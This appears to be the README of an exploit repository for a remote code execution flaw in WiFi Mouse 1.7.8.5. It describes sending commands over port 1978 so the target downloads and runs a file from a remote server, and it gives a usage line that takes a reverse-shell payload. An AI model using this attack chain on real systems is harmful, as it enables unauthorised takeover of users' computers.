# WiFi-Mouse-1.7.8.5---Remote-Code-Execution-v3-

This is a Python-based exploit for the WiFi Mouse (version 1.7.8.5) that leverages a Remote Code Execution (RCE) vulnerability.

## Description

WiFi Mouse allows users to control their PC using their smartphone as a remote. In version 1.7.8.5, a vulnerability exists that allows an attacker to send arbitrary commands to the target machine, resulting in remote code execution.

## Exploit Details

The exploit connects to the WiFi Mouse server on the target machine over port 1978, sends a payload to open `cmd.exe`, and executes commands such as downloading a file from a remote HTTP server and executing it on the target system.

## Usage

```bash
python3 exploit.py <target-ip> <tun0> <rev_shell payload>
